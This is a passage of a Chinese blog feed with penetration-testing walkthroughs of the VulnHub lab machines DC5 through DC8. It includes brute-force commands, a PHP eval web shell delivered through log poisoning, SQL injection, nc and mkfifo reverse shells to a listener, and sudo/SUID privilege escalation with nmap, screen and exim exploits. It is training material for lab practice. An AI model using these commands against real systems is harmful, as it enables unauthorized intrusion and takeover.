        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC6</title>
    <url>/2020/03/07/vulnhub-DC6/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC6</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p>本地dns解析<br>wpscan扫描用户<br>cewl生成爆破字典<br>wpscan进行爆破<br>wordpress的csrf漏洞<br>远程代码执行<br>nmap提权</p>
</blockquote>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>1.主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/1.png" alt="img"></p>
<p>发现目标靶机的ip为192.168.211.139</p>
<p>2.扫描目标靶机开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.139</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/2.png" alt="img"></p>
<p>目标靶机开放了80端口和22端口</p>
<p>访问80端口</p>
<p><img src="/2020/03/07/vulnhub-DC6/3.png" alt="img"></p>
<p>显示找不到服务器但是地址却变为wordy，所以应该是要本地dns解析</p>
<p><img src="/2020/03/07/vulnhub-DC6/4.png" alt="img"></p>
<p>找到hosts文件，在最下面添加上靶机ip</p>
<p><img src="/2020/03/07/vulnhub-DC6/5.png" alt="img"></p>
<p>成功打开，并且是一个WordPress网站</p>
<p><img src="/2020/03/07/vulnhub-DC6/6.png" alt="img"></p>
<p>我们可以使用wpscan扫描wpscan –url <a href="http://wordy" target="_blank" rel="noopener">http://wordy</a></p>
<p><img src="/2020/03/07/vulnhub-DC6/7.png" alt="img"></p>
<p>扫描网站用户wpscan –url <a href="http://wordy" target="_blank" rel="noopener">http://wordy</a> -e u</p>
<p><img src="/2020/03/07/vulnhub-DC6/8.png" alt="img"></p>
<p>将这些用户写入一个文件中用来爆破</p>
<p><img src="/2020/03/07/vulnhub-DC6/9.png" alt="img"></p>
<p>然后使用cewl生成爆破字典</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">cewl</span> <span class="selector-tag">wordy</span> &gt;<span class="selector-tag">pwd</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/10.png" alt="img"></p>
<p>然后使用nikto扫描网站后台</p>
<p><img src="/2020/03/07/vulnhub-DC6/11.png" alt="img"></p>
<p>用hydra爆破</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -L users<span class="selector-class">.txt</span> -P pwd<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">211.139</span> http-post-<span class="selector-tag">form</span> <span class="string">"/wp-login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> -F</span><br></pre></td></tr></table></figure>

<p>但是失败了。。。</p>
<p>然后再官方给出的线索发现了生成字典方法</p>
<p><img src="/2020/03/07/vulnhub-DC6/12.png" alt="img"></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">cat <span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wordlists/</span>rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line">将<span class="meta-keyword">/usr/</span>share/wordlists下的rockyou.txt.gz解压</span><br><span class="line">gunzip rockyou.txt.gz rockyou.txt</span><br></pre></td></tr></table></figure>

<p>然后生成密码字典</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt | <span class="keyword">grep</span> k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/13.png" alt="img"></p>
<p>再一次爆破</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -L users<span class="selector-class">.txt</span> -P /usr/share/wordlists/passwords<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">211.139</span> http-post-<span class="selector-tag">form</span> <span class="string">"/wp-login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> -F</span><br></pre></td></tr></table></figure>

<p>但是也没有跑出来</p>
<p>我们也可以使用wpscan的爆破模块</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url wordy -U users.txt -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>passwords.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/14.png" alt="img"></p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Username:</span> mark, <span class="string">Password:</span> helpdesk01</span><br></pre></td></tr></table></figure>

<p>然后使用mark登录后台成功</p>
<p><img src="/2020/03/07/vulnhub-DC6/15.png" alt="img"></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>在后台里面发现activity monitor插件，我们尝试搜索这个插件的漏洞</p>
<p><img src="/2020/03/07/vulnhub-DC6/16.png" alt="img"></p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/17.png" alt="img"></p>
<p>发现了一个wordpress的csrf漏洞，将其保存到本地，并对其适当修改</p>
<p><img src="/2020/03/07/vulnhub-DC6/18.png" alt="img"></p>
<p>然后冲本地去访问poc</p>
<p>访问前先本地监听一个端口，配置里面的端口一致9999</p>
<p><img src="/2020/03/07/vulnhub-DC6/19.png" alt="img"></p>
<p>直接打开点击访问</p>
<p><img src="/2020/03/07/vulnhub-DC6/20.png" alt="img"></p>
<p>成功getshell</p>
<p><img src="/2020/03/07/vulnhub-DC6/21.png" alt="img"></p>
<p> 还有一种方法就是根据poc找到漏洞页面，burp抓包，有一个远程代码执行漏洞</p>
<p><img src="/2020/03/07/vulnhub-DC6/22.png" alt="img"></p>
<p>然后用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/23.png" alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在/home/mark/stuff文件夹中发现了一个文本，里面似乎有graham的密码为GSo7isUM1D4</p>
<p><img src="/2020/03/07/vulnhub-DC6/24.png" alt="img"></p>
<p>su graham成功登录graham</p>
<p><img src="/2020/03/07/vulnhub-DC6/25.png" alt="img"></p>
<p>然后查看改用户可以执行的操作  sudo -l</p>
<p><img src="/2020/03/07/vulnhub-DC6/26.png" alt="img"></p>
<p>发现其可以运行jens里面的backups.sh脚本<br>向backups.sh文件中写入”/bin/bash”，并以jens用户去执行该脚本</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">echo <span class="string">"/bin/bash"</span> <span class="meta">&gt;&gt; </span>backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/27.png" alt="img"></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sudo -u jens <span class="string">./backups.sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/28.png" alt="img"></p>
<p>执行完后发现jens可以使用nmap且不需要密码</p>
<p><img src="/2020/03/07/vulnhub-DC6/29.png" alt="img"></p>
<p>百度了一下nmap提权，nmap可以用来执行一个脚本，参数为–script，因此下面我们建立一个脚本，然后使用root的身份执行nmap命令，nmap接着执行脚本<br>新建脚本，脚本的内容为反弹一个shell</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">touch root.<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'os.execute("/bin/sh")'</span> &gt; root.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/30.png" alt="img"></p>
<p>给与脚本可执行的权限</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chmod</span> +<span class="selector-tag">x</span> <span class="selector-tag">root</span><span class="selector-class">.sh</span></span><br></pre></td></tr></table></figure>

<p>使用root的身份执行nmap命令去执行一个脚本，namp执行完之后就会反弹一个shell</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sudo nmap <span class="params">--script=</span><span class="string">./root.sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC6/31.png" alt="img"></p>
<p>发现成功变为root权限</p>
<p><img src="/2020/03/07/vulnhub-DC6/32.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC7</title>
    <url>/2020/03/07/vulnhub-DC7/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC7</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p><code>Github</code>泄露网站数据库配置信息导致泄露<code>SSH</code><br><code>Drupal</code>重置网站管理员密码<br> <code>Drupal8</code>-Getshell<br>第三方软件提权<code>backups.sh</code></p>
</blockquote>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现<br>nmap -sP 192.168.211.1/24</p>
<p><img src="/2020/03/07/vulnhub-DC7/1.png" alt="img"></p>
<p>目标主机的ip为192.168.211.140<br>扫描靶机开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.140</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/2.png" alt="img"></p>
<p>靶机开放了22端口和80端口<br>访问80端口</p>
<p><img src="/2020/03/07/vulnhub-DC7/3.png" alt="img"><br>发现是一个drupal网站，并且提示我们暴力破解可能不会成功，方法在盒子外面<br>先扫描网站目录</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Nikto -h <span class="number">192.168</span><span class="number">.211</span><span class="number">.140</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/4.png" alt="img"></p>
<p>进行指纹识别</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">whatweb <span class="number">192.168</span><span class="number">.211</span><span class="number">.140</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/5.png" alt="img"></p>
<p>发现是durpal 8<br>并且左下角多了个@DC7USER<br>翻墙使用google搜素，发现是一个Twitter用户</p>
<p><img src="/2020/03/07/vulnhub-DC7/6.png" alt="img"></p>
<p>点进去后发现一个连接</p>
<p><img src="/2020/03/07/vulnhub-DC7/7.png" alt="img"></p>
<p>在staffdb中发现了一些文件</p>
<p><img src="/2020/03/07/vulnhub-DC7/8.png" alt="img"></p>
<p>当访问config.php时发现了数据库的用户名和密码</p>
<p><img src="/2020/03/07/vulnhub-DC7/9.png" alt="img"></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$servername = <span class="string">"localhost"</span><span class="comment">;</span></span><br><span class="line">$username = <span class="string">"dc7user"</span><span class="comment">;</span></span><br><span class="line">$password = <span class="string">"MdR3xOgB7#dW"</span><span class="comment">;</span></span><br><span class="line">$dbname = <span class="string">"Staff"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>因为靶机开放了22端口，所以可以使用ssh远程登录</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">dc7user@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.140</span>     连接成功</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/10.png" alt="img"></p>
<p>然后发现了几封邮件</p>
<p><img src="/2020/03/07/vulnhub-DC7/11.png" alt="img"></p>
<p>发现了一个脚本/opt/scripts/backups.sh    查看该脚本</p>
<p><img src="/2020/03/07/vulnhub-DC7/12.png" alt="img"></p>
<p>发现两个命令gpg和drush<br>gpg命令用来加密，drush命令是drupal框架中用来做一些配置的命令，它可以改变用户名密码<br>进入到/var/www/html目录下，因为网站会有一个admin用户，所以使用drush命令修改admin用户的密码为123456，发现可以修改成功</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">drush <span class="keyword">user</span>-<span class="keyword">password</span> <span class="keyword">admin</span> <span class="comment">--password="123456"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/13.png" alt="img"></p>
<p>然后成功登录网站</p>
<p><img src="/2020/03/07/vulnhub-DC7/14.png" alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在content界面发现可以写东西但是没有PHP模块</p>
<p><img src="/2020/03/07/vulnhub-DC7/15.png" alt="img"></p>
<p>然后再extend里面安装 </p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="keyword">ftp</span>.drupal.org/<span class="built_in">files</span>/projects/php<span class="number">-8.</span>x<span class="number">-1.0</span>.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/16.png" alt="img"></p>
<p>安装成功</p>
<p><img src="/2020/03/07/vulnhub-DC7/17.png" alt="img"></p>
<p>勾选php filter然后再点install</p>
<p><img src="/2020/03/07/vulnhub-DC7/18.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC7/19.png" alt="img"></p>
<p>然后就可以使用PHP了</p>
<p><img src="/2020/03/07/vulnhub-DC7/20.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC7/21.png" alt="img"></p>
<p>然后直接用蚁剑连接</p>
<p><img src="/2020/03/07/vulnhub-DC7/22.png" alt="img"></p>
<p>然后反弹shell，发现靶机上安装了nc，直接用nc反弹shell</p>
<p><img src="/2020/03/07/vulnhub-DC7/23.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash <span class="number">192.168</span><span class="number">.211</span><span class="number">.135</span> <span class="number">333</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/24.png" alt="img"></p>
<p>kali里面监听333端口nc -lvvp 333</p>
<p><img src="/2020/03/07/vulnhub-DC7/25.png" alt="img"></p>
<p>然后用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/26.png" alt="img"></p>
<p>当前用户是www-data，在/opt/scripts目录下的backups.sh脚本文件所属组是www-data，所以www-data用户可以对这个脚本文件进行操作，并且这个脚本文件定时执行可以利用它来反弹shell<br>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.43.84 lport=7373 R<br>执行这条命令后将最下面的话写入</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">echo <span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.211.135 444 &gt;/tmp/f"</span> <span class="meta">&gt;&gt; </span>backups.sh</span><br></pre></td></tr></table></figure>

<p>这条命令没有弹成功</p>
<p><img src="/2020/03/07/vulnhub-DC7/27.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC7/28.png" alt="img"></p>
<p>kali上监听444端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">444</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC7/29.png" alt="img"></p>
<p>执行脚本并且成功反弹shell</p>
<p><img src="/2020/03/07/vulnhub-DC7/30.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC5</title>
    <url>/2020/03/07/vulnhub-DC5/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC5</strong><br><strong>知识点：</strong></p>
<blockquote>
<p>nginx日志包含<br><code>LFI</code>(本地文件包含)日志获取shell (日志包含)<br><code>wfuzz</code>工具的使用<br><code>screen4.5.0</code>提权root</p>
</blockquote>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>1.主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/1.png" alt="img"></p>
<p>得到靶机的ip地址为192.168.211.138<br>2.扫描靶机开放的端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.138</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/2.png" alt="img"><br>发现靶机开放了80端口和111端口<br>我们尝试访问80端口<br>发现网页全是静态的 ，只有一个提交留言的窗口</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="/2020/03/07/vulnhub-DC5/3.png" alt="img"><br>我们测试是否存在xss漏洞<br><img src="/2020/03/07/vulnhub-DC5/4.png" alt="img"><br>我们发现我们传的变量全部都在url里面<br><img src="/2020/03/07/vulnhub-DC5/5.png" alt="img"><br>并且随着不断刷新，<br><img src="/2020/03/07/vulnhub-DC5/6.png" alt="img"><br>这下面也在 不断改变</p>
<p><img src="/2020/03/07/vulnhub-DC5/7.png" alt="img"><br>并且我们通过爆破目录文件发现footer.php也是随着刷新而改变所以极有可能存在文件包含<br>然后使用burp爆破变量名</p>
<p><img src="/2020/03/07/vulnhub-DC5/8.png" alt="img"><br>说明file很有可能是传参的变量，尝试/etc/passwd成功执行<br><img src="/2020/03/07/vulnhub-DC5/9.png" alt="img"><br>然后尝试通过日志文件上传一句话木马获得shell<br><img src="/2020/03/07/vulnhub-DC5/10.png" alt="img"></p>
<p>其日志文件位置/var/log/nginx/access.log</p>
<p><img src="/2020/03/07/vulnhub-DC5/11.png" alt="img"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">asdfg<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">123</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/12.png" alt="img"></p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168.</span><span class="number">211.138</span>/thankyou.php?<span class="keyword">file</span>=/var/<span class="built_in">log</span>/nginx/<span class="keyword">access</span>.<span class="built_in">log</span>使用蚁剑连接成功</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/13.png" alt="img"><br>使用虚拟终端<br><img src="/2020/03/07/vulnhub-DC5/14.png" alt="img"><br>然后我们发现有nc，所以尝试nc反弹shell<br><img src="/2020/03/07/vulnhub-DC5/15.png" alt="img"><br><img src="/2020/03/07/vulnhub-DC5/16.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash <span class="number">192.168</span><span class="number">.211</span><span class="number">.135</span> <span class="number">7777</span>   反弹成功</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/17.png" alt="img"><br>然后进入交互模式python -c “import pty;pty.spawn(‘/bin/bash’)”<br><img src="/2020/03/07/vulnhub-DC5/18.png" alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>su -l  查看是否有命令在执行期间有root权限并且没有密码保护，但是没有<br><img src="/2020/03/07/vulnhub-DC5/19.png" alt="img"><br>然后查看一些具有suid权限的命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/20.png" alt="img"></p>
<p>发现一个具有root权限的软件screen4.5.0，我们查看该软件是否存在漏洞searchsploit screen 4.5.0         发现一个脚本</p>
<p><img src="/2020/03/07/vulnhub-DC5/21.png" alt="img"></p>
<p>查看该漏洞</p>
<p><img src="/2020/03/07/vulnhub-DC5/22.png" alt="img"></p>
<p>按照步骤编译脚本vim /tmp/libhax.c</p>
<p><img src="/2020/03/07/vulnhub-DC5/23.png" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o <span class="regexp">/tmp/</span>libhax.so <span class="regexp">/tmp/</span>libhax.c</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/24.png" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/25.png" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC5/26.png" alt="img"></p>
<p>编译好libhax.so和rootshell,用wget上传至靶机 tmp目录</p>
<p><img src="/2020/03/07/vulnhub-DC5/27.png" alt="img"></p>
<p>我们先本地开启80端口python -m SimpleHTTPServer 80</p>
<p><img src="/2020/03/07/vulnhub-DC5/28.png" alt="img"></p>
<p>文件能顺利下载</p>
<p><img src="/2020/03/07/vulnhub-DC5/29.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC5/30.png" alt="img"></p>
<p>上传成功</p>
<p><img src="/2020/03/07/vulnhub-DC5/31.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC5/32.png" alt="img"></p>
<p>然后使用脚本里面的方法提权</p>
<p><img src="/2020/03/07/vulnhub-DC5/33.png" alt="img"></p>
<p>成功获得root权限</p>
<p><img src="/2020/03/07/vulnhub-DC5/34.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC5/35.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC8</title>
    <url>/2020/03/07/vulnhub-DC8/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC8</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p><code>Drupal 7</code> SQL注入<br><code>john</code>破解<code>HASH</code><br> <code>Drupal 7</code> 后台编辑页面 <code>Getshell</code><br> <code>exim</code>SUID本地提权</p>
</blockquote>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/1.png" alt="img"></p>
<p>目标主机的ip为192.168.211.141<br>扫描靶机开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.141</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/2.png" alt="img"></p>
<p>靶机开放了22端口和80端口<br>访问80端口</p>
<p><img src="/2020/03/07/vulnhub-DC8/3.png" alt="img"></p>
<p>发现还是一个drupal网站并且显示此网站收到干扰<br>先扫描网站目录</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Nikto -h <span class="number">192.168</span><span class="number">.211</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/4.png" alt="img"></p>
<p>进行指纹识别whatweb 192.1 68.211.141  发现是一个drupal 7网站</p>
<p><img src="/2020/03/07/vulnhub-DC8/5.png" alt="img"></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我们发现左边这三项上下其实是不一样的，在contact us中为?sid 在dc-8中为?nid  但是只有在nid中发现有SQL注入点，并且很容易手工注入出用户名和密码</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/6.png" alt="img"></p>
<p>有两个用户，admin和john，将其放在john中破解密码</p>
<p><img src="/2020/03/07/vulnhub-DC8/7.png" alt="img"></p>
<p>跑了很久之跑出了john的密码为turtle</p>
<p><img src="/2020/03/07/vulnhub-DC8/8.png" alt="img"></p>
<p>去尝试登录，并且登录成功</p>
<p><img src="/2020/03/07/vulnhub-DC8/9.png" alt="img"></p>
<p>找了很久，在Add content–&gt;Webform去添加webshell</p>
<p><img src="/2020/03/07/vulnhub-DC8/10.png" alt="img"></p>
<p>随便添加一个，点进去，在form setting里面发现可以写php</p>
<p><img src="/2020/03/07/vulnhub-DC8/11.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC8/12.png" alt="img"></p>
<p>写入一句话木马</p>
<p><img src="/2020/03/07/vulnhub-DC8/13.png" alt="img"></p>
<p>点击刚才创建的webshell用中国蚁剑连接</p>
<p><img src="/2020/03/07/vulnhub-DC8/14.png" alt="img"></p>
<p>但是找不到路径，所以只能直接反弹shell</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"nc -e /bin/bash 192.168.211.135 7777"</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/15.png" alt="img"></p>
<p>现在主机上监听7777端口</p>
<p><img src="/2020/03/07/vulnhub-DC8/16.png" alt="img"></p>
<p>发现这些代码要提交表单后才能执行，之前创建的没有创建表单，所以直接在contact us里面编写反弹shell的代码</p>
<p><img src="/2020/03/07/vulnhub-DC8/17.png" alt="img"></p>
<p>然后提交表单</p>
<p><img src="/2020/03/07/vulnhub-DC8/18.png" alt="img"></p>
<p>成功getshell</p>
<p><img src="/2020/03/07/vulnhub-DC8/19.png" alt="img"></p>
<p>然后使用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/20.png" alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux里面有个suid权限执行二进制文件，这个权限涉及的命令权限都很大。<br>我们用find命令查询一下这些命令：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">或者</span><br><span class="line"><span class="builtin-name">find</span> / -perm -4000 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/21.png" alt="img"></p>
<p>发现exim4，查看对应版本信息</p>
<p><img src="/2020/03/07/vulnhub-DC8/22.png" alt="img"></p>
<p>然后 使用searchsloit搜索</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit exim</span></span><br></pre></td></tr></table></figure>

<p>发现可利用的脚本</p>
<p><img src="/2020/03/07/vulnhub-DC8/23.png" alt="img"></p>
<p>查看脚本</p>
<p><img src="/2020/03/07/vulnhub-DC8/24.png" alt="img"><br>本地开启80端口，让靶机去下载该脚本python -m SimpleHTTPServer 80</p>
<p><img src="/2020/03/07/vulnhub-DC8/25.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC8/26.png" alt="img"></p>
<p>使用wget下载，发现只有在tmp目录下有权限</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">wget <span class="string">http:</span><span class="comment">//192.168.211.135/exp.sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/27.png" alt="img"></p>
<p>根据脚本里面的方法提权（netcat）</p>
<p><img src="/2020/03/07/vulnhub-DC8/28.png" alt="img"></p>
<p>发现文件无法执行，所以先给文件一个权限</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">chmod <span class="number">777</span> <span class="built_in">exp</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC8/29.png" alt="img"></p>
<p>kali监听31337端口—不用监听，脚本直接使用，不用修改<br>执行脚本./exp.sh -m netcat<br>成功反弹shell且为root权限</p>
<p><img src="/2020/03/07/vulnhub-DC8/30.png" alt="img"></p>
<p>成功查看到flag</p>
<p><img src="/2020/03/07/vulnhub-DC8/31.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机Os-hackNos-1</title>
